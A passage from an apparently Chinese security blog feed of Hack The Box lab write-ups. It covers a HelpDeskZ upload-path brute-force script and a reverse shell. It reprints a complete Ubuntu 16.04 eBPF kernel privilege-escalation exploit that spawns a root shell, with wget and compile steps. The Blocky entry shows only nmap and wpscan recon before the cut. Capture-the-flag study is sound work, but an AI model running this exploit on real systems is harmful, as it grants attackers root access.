class="token punctuation">(</span>currentTime <span class="token operator">-</span> x<span class="token punctuation">)</span>    md5hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> helpdeskzBaseUrl<span class="token operator">+</span>md5hash<span class="token operator">+</span><span class="token string">'.php'</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>head<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"found!"</span>        <span class="token keyword">print</span> url        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"Sorry, I did not find anything"</span></code></pre><p>成功反弹 shell：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185003.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185009.png-water_print" alt=""></p><p>查看 <code>user.txt</code> 获取第一个 flag</p><p><code>whoami</code> 查看权限，发现时普通用户权限</p><p><code>uname -a</code>查看内核版本号，尝试内核提权。<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185333.png-water_print" alt=""></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>搜索相关内核版本漏洞信息，发现<a href="https://www.exploit-db.com/exploits/44298" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44298</a></p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* * Ubuntu 16.04.4 kernel priv esc * * all credits to @bleidl * - vnik */</span><span class="token comment" spellcheck="true">// Tested on:</span><span class="token comment" spellcheck="true">// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64</span><span class="token comment" spellcheck="true">// if different kernel adjust CRED offset + check kernel stack size</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;errno.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/bpf.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/un.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> PHYS_OFFSET 0xffff880000000000</span><span class="token macro property">#<span class="token directive keyword">define</span> CRED_OFFSET 0x5f8</span><span class="token macro property">#<span class="token directive keyword">define</span> UID_OFFSET 4</span><span class="token macro property">#<span class="token directive keyword">define</span> LOG_BUF_SIZE 65536</span><span class="token macro property">#<span class="token directive keyword">define</span> PROGSIZE 328</span><span class="token keyword">int</span> sockets<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> mapfd<span class="token punctuation">,</span> progfd<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>__prog <span class="token operator">=</span>  <span class="token string">"\xb4\x09\x00\x00\xff\xff\xff\xff"</span>        <span class="token string">"\x55\x09\x02\x00\xff\xff\xff\xff"</span>        <span class="token string">"\xb7\x00\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\x18\x19\x00\x00\x03\x00\x00\x00"</span>        <span class="token string">"\x00\x00\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\xbf\x91\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\xbf\xa2\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\x07\x02\x00\x00\xfc\xff\xff\xff"</span>        <span class="token string">"\x62\x0a\xfc\xff\x00\x00\x00\x00"</span>        <span class="token string">"\x85\x00\x00\x00\x01\x00\x00\x00"</span>        <span class="token string">"\x55\x00\x01\x00\x00\x00\x00\x00"</span>        <span class="token string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\x79\x06\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\xbf\x91\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\xbf\xa2\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\x07\x02\x00\x00\xfc\xff\xff\xff"</span>        <span class="token string">"\x62\x0a\xfc\xff\x01\x00\x00\x00"</span>        <span class="token string">"\x85\x00\x00\x00\x01\x00\x00\x00"</span>        <span class="token string">"\x55\x00\x01\x00\x00\x00\x00\x00"</span>        <span class="token string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\x79\x07\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\xbf\x91\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\xbf\xa2\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\x07\x02\x00\x00\xfc\xff\xff\xff"</span>        <span class="token string">"\x62\x0a\xfc\xff\x02\x00\x00\x00"</span>        <span class="token string">"\x85\x00\x00\x00\x01\x00\x00\x00"</span>        <span class="token string">"\x55\x00\x01\x00\x00\x00\x00\x00"</span>        <span class="token string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\x79\x08\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\xbf\x02\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\xb7\x00\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\x55\x06\x03\x00\x00\x00\x00\x00"</span>        <span class="token string">"\x79\x73\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\x7b\x32\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\x55\x06\x02\x00\x01\x00\x00\x00"</span>        <span class="token string">"\x7b\xa2\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\x7b\x87\x00\x00\x00\x00\x00\x00"</span>        <span class="token string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span><span class="token punctuation">;</span><span class="token keyword">char</span> bpf_log_buf<span class="token punctuation">[</span>LOG_BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">bpf_prog_load</span><span class="token punctuation">(</span><span class="token keyword">enum</span> bpf_prog_type prog_type<span class="token punctuation">,</span>          <span class="token keyword">const</span> <span class="token keyword">struct</span> bpf_insn <span class="token operator">*</span>insns<span class="token punctuation">,</span> <span class="token keyword">int</span> prog_len<span class="token punctuation">,</span>          <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>license<span class="token punctuation">,</span> <span class="token keyword">int</span> kern_version<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">union</span> bpf_attr attr <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span>prog_type <span class="token operator">=</span> prog_type<span class="token punctuation">,</span>        <span class="token punctuation">.</span>insns <span class="token operator">=</span> <span class="token punctuation">(</span>__u64<span class="token punctuation">)</span>insns<span class="token punctuation">,</span>        <span class="token punctuation">.</span>insn_cnt <span class="token operator">=</span> prog_len <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> bpf_insn<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">.</span>license <span class="token operator">=</span> <span class="token punctuation">(</span>__u64<span class="token punctuation">)</span>license<span class="token punctuation">,</span>        <span class="token punctuation">.</span>log_buf <span class="token operator">=</span> <span class="token punctuation">(</span>__u64<span class="token punctuation">)</span>bpf_log_buf<span class="token punctuation">,</span>        <span class="token punctuation">.</span>log_size <span class="token operator">=</span> LOG_BUF_SIZE<span class="token punctuation">,</span>        <span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    attr<span class="token punctuation">.</span>kern_version <span class="token operator">=</span> kern_version<span class="token punctuation">;</span>    bpf_log_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_bpf<span class="token punctuation">,</span> BPF_PROG_LOAD<span class="token punctuation">,</span> <span class="token operator">&amp;</span>attr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>attr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">bpf_create_map</span><span class="token punctuation">(</span><span class="token keyword">enum</span> bpf_map_type map_type<span class="token punctuation">,</span> <span class="token keyword">int</span> key_size<span class="token punctuation">,</span> <span class="token keyword">int</span> value_size<span class="token punctuation">,</span>           <span class="token keyword">int</span> max_entries<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">union</span> bpf_attr attr <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span>map_type <span class="token operator">=</span> map_type<span class="token punctuation">,</span>        <span class="token punctuation">.</span>key_size <span class="token operator">=</span> key_size<span class="token punctuation">,</span>        <span class="token punctuation">.</span>value_size <span class="token operator">=</span> value_size<span class="token punctuation">,</span>        <span class="token punctuation">.</span>max_entries <span class="token operator">=</span> max_entries    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_bpf<span class="token punctuation">,</span> BPF_MAP_CREATE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>attr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>attr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">bpf_update_elem</span><span class="token punctuation">(</span>uint64_t key<span class="token punctuation">,</span> uint64_t value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">union</span> bpf_attr attr <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span>map_fd <span class="token operator">=</span> mapfd<span class="token punctuation">,</span>        <span class="token punctuation">.</span>key <span class="token operator">=</span> <span class="token punctuation">(</span>__u64<span class="token punctuation">)</span><span class="token operator">&amp;</span>key<span class="token punctuation">,</span>        <span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token punctuation">(</span>__u64<span class="token punctuation">)</span><span class="token operator">&amp;</span>value<span class="token punctuation">,</span>        <span class="token punctuation">.</span>flags <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_bpf<span class="token punctuation">,</span> BPF_MAP_UPDATE_ELEM<span class="token punctuation">,</span> <span class="token operator">&amp;</span>attr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>attr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">bpf_lookup_elem</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>key<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">union</span> bpf_attr attr <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span>map_fd <span class="token operator">=</span> mapfd<span class="token punctuation">,</span>        <span class="token punctuation">.</span>key <span class="token operator">=</span> <span class="token punctuation">(</span>__u64<span class="token punctuation">)</span>key<span class="token punctuation">,</span>        <span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token punctuation">(</span>__u64<span class="token punctuation">)</span>value<span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_bpf<span class="token punctuation">,</span> BPF_MAP_LOOKUP_ELEM<span class="token punctuation">,</span> <span class="token operator">&amp;</span>attr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>attr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">__exit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"error: %s\n"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">prep</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    mapfd <span class="token operator">=</span> <span class="token function">bpf_create_map</span><span class="token punctuation">(</span>BPF_MAP_TYPE_ARRAY<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>mapfd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">__exit</span><span class="token punctuation">(</span><span class="token function">strerror</span><span class="token punctuation">(</span>errno<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    progfd <span class="token operator">=</span> <span class="token function">bpf_prog_load</span><span class="token punctuation">(</span>BPF_PROG_TYPE_SOCKET_FILTER<span class="token punctuation">,</span>            <span class="token punctuation">(</span><span class="token keyword">struct</span> bpf_insn <span class="token operator">*</span><span class="token punctuation">)</span>__prog<span class="token punctuation">,</span> PROGSIZE<span class="token punctuation">,</span> <span class="token string">"GPL"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>progfd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">__exit</span><span class="token punctuation">(</span><span class="token function">strerror</span><span class="token punctuation">(</span>errno<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">socketpair</span><span class="token punctuation">(</span>AF_UNIX<span class="token punctuation">,</span> SOCK_DGRAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sockets<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">__exit</span><span class="token punctuation">(</span><span class="token function">strerror</span><span class="token punctuation">(</span>errno<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">setsockopt</span><span class="token punctuation">(</span>sockets<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> SOL_SOCKET<span class="token punctuation">,</span> SO_ATTACH_BPF<span class="token punctuation">,</span> <span class="token operator">&amp;</span>progfd<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>progfd<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">__exit</span><span class="token punctuation">(</span><span class="token function">strerror</span><span class="token punctuation">(</span>errno<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">writemsg</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    ssize_t n <span class="token operator">=</span> <span class="token function">write</span><span class="token punctuation">(</span>sockets<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"write"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">!=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"short write: %lu\n"</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token macro property">#<span class="token directive keyword">define</span> __update_elem(a, b, c) \    bpf_update_elem(0, (a)); \    bpf_update_elem(1, (b)); \    bpf_update_elem(2, (c)); \    writemsg();</span><span class="token keyword">static</span> uint64_t <span class="token function">get_value</span><span class="token punctuation">(</span><span class="token keyword">int</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>    uint64_t value<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">bpf_lookup_elem</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>key<span class="token punctuation">,</span> <span class="token operator">&amp;</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">__exit</span><span class="token punctuation">(</span><span class="token function">strerror</span><span class="token punctuation">(</span>errno<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> value<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> uint64_t <span class="token function">__get_fp</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">__update_elem</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">get_value</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> uint64_t <span class="token function">__read</span><span class="token punctuation">(</span>uint64_t addr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">__update_elem</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> addr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">get_value</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">__write</span><span class="token punctuation">(</span>uint64_t addr<span class="token punctuation">,</span> uint64_t val<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">__update_elem</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> addr<span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> uint64_t <span class="token function">get_sp</span><span class="token punctuation">(</span>uint64_t addr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> addr <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token number">0x4000</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    uint64_t fp<span class="token punctuation">,</span> sp<span class="token punctuation">,</span> task_struct<span class="token punctuation">,</span> credptr<span class="token punctuation">,</span> uidptr<span class="token punctuation">;</span>    fp <span class="token operator">=</span> <span class="token function">__get_fp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">&lt;</span> PHYS_OFFSET<span class="token punctuation">)</span>        <span class="token function">__exit</span><span class="token punctuation">(</span><span class="token string">"bogus fp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    sp <span class="token operator">=</span> <span class="token function">get_sp</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>sp <span class="token operator">&lt;</span> PHYS_OFFSET<span class="token punctuation">)</span>        <span class="token function">__exit</span><span class="token punctuation">(</span><span class="token string">"bogus sp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    task_struct <span class="token operator">=</span> <span class="token function">__read</span><span class="token punctuation">(</span>sp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>task_struct <span class="token operator">&lt;</span> PHYS_OFFSET<span class="token punctuation">)</span>        <span class="token function">__exit</span><span class="token punctuation">(</span><span class="token string">"bogus task ptr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"task_struct = %lx\n"</span><span class="token punctuation">,</span> task_struct<span class="token punctuation">)</span><span class="token punctuation">;</span>    credptr <span class="token operator">=</span> <span class="token function">__read</span><span class="token punctuation">(</span>task_struct <span class="token operator">+</span> CRED_OFFSET<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// cred</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>credptr <span class="token operator">&lt;</span> PHYS_OFFSET<span class="token punctuation">)</span>        <span class="token function">__exit</span><span class="token punctuation">(</span><span class="token string">"bogus cred ptr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uidptr <span class="token operator">=</span> credptr <span class="token operator">+</span> UID_OFFSET<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// uid</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>uidptr <span class="token operator">&lt;</span> PHYS_OFFSET<span class="token punctuation">)</span>        <span class="token function">__exit</span><span class="token punctuation">(</span><span class="token string">"bogus uid ptr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"uidptr = %lx\n"</span><span class="token punctuation">,</span> uidptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">__write</span><span class="token punctuation">(</span>uidptr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// set both uid and gid to 0</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"spawning root shell\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">__exit</span><span class="token punctuation">(</span><span class="token string">"not vulnerable?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">prep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>将 exp 文件上传到服务器：<br>本机执行 <code>python -m SimpleHTTPServer 80</code><br>服务器上执行 <code>wget http://10.10.14.10/root.c</code></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185729.png-water_print" alt=""></p><p>编译 exp：</p><pre class=" language-bash"><code class="language-bash">gcc exp.c</code></pre><p>得到可执行文件，执行后，得到 root 的 shell<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185754.png-water_print" alt=""></p><p><code>car /root/root.txt</code> 获得第二个 flag。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hack The Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack The Box —— Blocky</title>
      <link href="/2019/09/06/hackthebox-blocky/"/>
      <url>/2019/09/06/hackthebox-blocky/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Box-——-Blocky"><a href="#Hack-The-Box-——-Blocky" class="headerlink" title="Hack The Box —— Blocky"></a>Hack The Box —— Blocky</h1><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906143059.png-water_print" alt=""></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><pre><code>nmap -T4 -A -v 10.10.10.37</code></pre><pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-06 10:37 CSTPORT     STATE  SERVICE VERSION21/tcp   open   ftp     ProFTPD 1.3.5a22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))|_http-generator: WordPress 4.8| http-methods:|_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: BlockyCraft &amp;#8211; Under Construction!8192/tcp closed sophosService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>开放了21、22、80 端口。</p><p>尝试搜索 <code>ProFTPD 1.3.5a</code> 版本的漏洞，发现<code>未授权文件复制</code>漏洞，利用 msf 测试，无法利用。</p><p>访问 80 端口，是一个简单的 WordPress 站点， 利用 <code>wpscan</code> 工具进行扫描：</p><pre class=" language-bash"><code class="language-bash">wpscan --enumerate t --enumerate p --enumerate u --url<span class="token operator">=</span>http://10.10.10.37/</code></pre><p>得到以下信息：</p><table><thead><tr><th align="center">用户名</th><th align="center">notch</th></tr></thead><tbody><tr><td align="center">主题</td><td align="center">twentyseventeen</td></tr><tr><td align="center">插件</td><td align="center">akismet - v3.3.2</td></tr></tbody></table><p>未发现相关漏洞。</p><h3 